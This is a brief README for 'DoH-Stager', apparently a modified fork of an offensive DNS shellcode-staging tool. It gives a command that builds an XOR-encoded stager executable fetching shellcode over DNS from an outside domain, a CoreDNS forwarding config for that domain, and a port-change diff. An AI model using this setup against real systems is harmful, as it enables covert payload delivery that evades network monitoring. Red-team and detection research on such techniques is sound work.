# DoH-Stager


## Usage

```
./dnsstager.py  --domain p.pacc.tortellozzi.club --payload x64/c/ipv6 --o
utput ~/payload.exe --prefix emperor --sleep 1 --xorkey 0x10 --shellcode_path ~/calc-thread64.bin
```

Corefile
```
. {
log
  forward . 9.9.9.9
}

p.pacc.tortellozzi.club {
        log
        forward . 127.0.0.1:5050
}
```

What was changed:
```
--- a/core/functions.py
+++ b/core/functions.py
@@ -185,8 +185,8 @@ def start_dns_server(ZONES):
     resolver = Resolver(ZONES)

     try:
-        server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
-        print_success("Server started!")
+        server = DNSServer(resolver, port=5050, address="0.0.0.0", tcp=False)
+        print_success("Server started on port 5050!")
         server.start()
```
